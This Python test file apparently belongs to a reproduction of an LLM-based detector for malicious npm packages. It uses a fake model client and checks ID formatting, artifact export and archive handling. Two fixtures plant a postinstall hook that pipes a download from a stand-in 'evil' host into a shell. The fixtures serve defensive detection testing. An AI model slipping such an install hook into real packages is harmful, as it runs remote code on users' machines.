from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
import zipfile

from socketai_reproduce.analysis.models import CodeQLResult, UsageStats
from socketai_reproduce.config import WorkflowConfig, build_batch_id, build_run_id
from socketai_reproduce.workflow import SocketAIWorkflow


class FakeLLMClient:
    model_name = "fake-model"
    provider_name = "fake-provider"

    def __init__(self) -> None:
        self.calls: dict[tuple[str, str], int] = {}

    def generate(self, messages, *, temperature: float, n: int = 1):  # noqa: ANN001
        del temperature, n
        prompt = messages[-1]["content"]
        relative_path = _extract_between(prompt, '"relative_path": "', '"')
        if '"final_label"' in prompt:
            stage = "stage3"
        elif '"changes_made"' in prompt:
            stage = "stage2"
        else:
            stage = "stage1"

        key = (stage, relative_path)
        self.calls[key] = self.calls.get(key, 0) + 1

        if relative_path == "scripts/postinstall.js" and stage == "stage1" and self.calls[key] == 1:
            text = "this is not valid json"
        else:
            text = self._build_response(stage, relative_path)

        return {
            "texts": [text],
            "usage": UsageStats(prompt_tokens=10, completion_tokens=5, total_tokens=15),
            "latency_ms": 1,
        }

    def _build_response(self, stage: str, relative_path: str) -> str:
        suspicious = relative_path == "scripts/postinstall.js"
        if stage == "stage1":
            return json.dumps(
                {
                    "label": "malicious" if suspicious else "benign",
                    "score": 0.82 if suspicious else 0.05,
                    "confidence": 0.9 if suspicious else 0.8,
                    "suspicious_behaviors": ["exec", "curl"] if suspicious else [],
                    "reasoning_summary": "Downloads and executes shell content."
                    if suspicious
                    else "No malicious behavior detected.",
                }
            )
        if stage == "stage2":
            return json.dumps(
                {
                    "label": "malicious" if suspicious else "benign",
                    "score": 0.5 if suspicious else 0.02,
                    "confidence": 0.88 if suspicious else 0.82,
                    "suspicious_behaviors": ["exec", "curl"] if suspicious else [],
                    "reasoning_summary": "The file still appears malicious after review."
                    if suspicious
                    else "The file remains benign after review.",
                    "changes_made": ["Lowered score after re-check."] if suspicious else [],
                }
            )
        return json.dumps(
            {
                "final_label": "malicious" if suspicious else "benign",
                "final_score": 0.5 if suspicious else 0.02,
                "confidence": 0.87 if suspicious else 0.84,
                "evidence": ["exec", "curl"] if suspicious else [],
                "benign_explanations": [] if suspicious else ["Utility script only."],
                "malicious_explanations": ["Downloads and executes a remote payload."]
                if suspicious
                else [],
            }
        )


class WorkflowTests(unittest.TestCase):
    def test_build_run_id_compacts_long_input_names(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            long_name = (
                "2024-09-03-videoads-util-capability-detection-v1.0.3-with-extra-suffix-for-testing.tgz"
            )
            sample = Path(tmp) / long_name
            sample.write_text("placeholder", encoding="utf-8")

            run_id = build_run_id(sample)

            self.assertLessEqual(len(run_id), 52)
            self.assertRegex(run_id, r"^\d{8}T\d{6}Z-[a-z0-9-]+-[0-9a-f]{10}$")

    def test_build_batch_id_compacts_manifest_names(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            manifest = Path(tmp) / "dataset-main-p0-33-66-100-with-extra-suffix-for-testing.jsonl"
            manifest.write_text("", encoding="utf-8")

            batch_id = build_batch_id(manifest)

            self.assertLessEqual(len(batch_id), 42)
            self.assertRegex(batch_id, r"^batch-\d{8}T\d{6}Z-[a-z0-9-]+-[0-9a-f]{10}$")

    def test_workflow_exports_debug_artifacts_and_aggregates_threshold(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            package_root = Path(tmp) / "pkg"
            scripts_dir = package_root / "scripts"
            scripts_dir.mkdir(parents=True)
            (package_root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "workflow-demo",
                        "version": "1.0.0",
                        "scripts": {"postinstall": "node scripts/postinstall.js"},
                    }
                ),
                encoding="utf-8",
            )
            (package_root / "index.js").write_text("module.exports = 1;\n", encoding="utf-8")
            (scripts_dir / "postinstall.js").write_text(
                "require('child_process').exec('curl https://evil | sh')\n",
                encoding="utf-8",
            )

            workflow = SocketAIWorkflow(
                config=WorkflowConfig(
                    model="fake-model",
                    provider="fake-provider",
                    use_codeql=False,
                ),
                llm_client=FakeLLMClient(),
                codeql_prescreener=None,
            )

            result = workflow.detect(package_root, Path(tmp) / "runs")

            self.assertEqual(result.package_summary.label, "malicious")
            self.assertEqual(result.package_summary.flagged_file_count, 1)
            self.assertEqual(result.package_summary.max_file_score, 0.5)

            malicious_result = next(
                file_result
                for file_result in result.files
                if file_result.relative_path == "scripts/postinstall.js"
            )
            self.assertEqual(malicious_result.stage1.retry_count, 1)
            self.assertEqual(malicious_result.final_score, 0.5)

            run_dir = Path(result.run_meta.output_dir)
            self.assertTrue((run_dir / "package_summary.json").exists())
            self.assertTrue((run_dir / "files.jsonl").exists())
            self.assertTrue((run_dir / "stages" / malicious_result.file_id / "stage1.json").exists())
            self.assertTrue((run_dir / "exports" / "file_level.csv").exists())
            self.assertTrue((run_dir / "exports" / "package_level.csv").exists())

    def test_archive_detection_uses_short_global_scratch_outside_batch_run_dir(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            archive_name = "2024-09-03-videoads-util-capability-detection-v1.0.3.zip"
            archive_path = tmp_path / archive_name

            with zipfile.ZipFile(archive_path, "w") as archive:
                archive.writestr(
                    "package/package.json",
                    json.dumps(
                        {
                            "name": "archive-demo",
                            "version": "1.0.0",
                            "scripts": {"postinstall": "node scripts/postinstall.js"},
                        }
                    ),
                )
                archive.writestr("package/index.js", "module.exports = 1;\n")
                archive.writestr(
                    "package/scripts/postinstall.js",
                    "require('child_process').exec('curl https://evil | sh')\n",
                )

            scratch_root = tmp_path / "result" / "_scratch"
            batch_output_root = (
                tmp_path
                / "result"
                / "batches"
                / "batch-20260408T154352Z-dataset-main-p0-33-66-100-f38ae8c38a"
                / "runs"
            )
            workflow = SocketAIWorkflow(
                config=WorkflowConfig(
                    model="fake-model",
                    provider="fake-provider",
                    use_codeql=False,
                    scratch_output_dir=scratch_root,
                ),
                llm_client=FakeLLMClient(),
                codeql_prescreener=None,
            )

            result = workflow.detect(archive_path, batch_output_root)

            extracted_package_root = Path(result.run_meta.package_root).resolve()
            run_output_dir = Path(result.run_meta.output_dir).resolve()
            self.assertTrue(extracted_package_root.is_relative_to(scratch_root.resolve()))
            self.assertFalse(extracted_package_root.is_relative_to(run_output_dir))
            self.assertEqual(result.package_summary.label, "malicious")


def _extract_between(text: str, prefix: str, suffix: str) -> str:
    start = text.index(prefix) + len(prefix)
    end = text.index(suffix, start)
    return text[start:end]


if __name__ == "__main__":
    unittest.main()
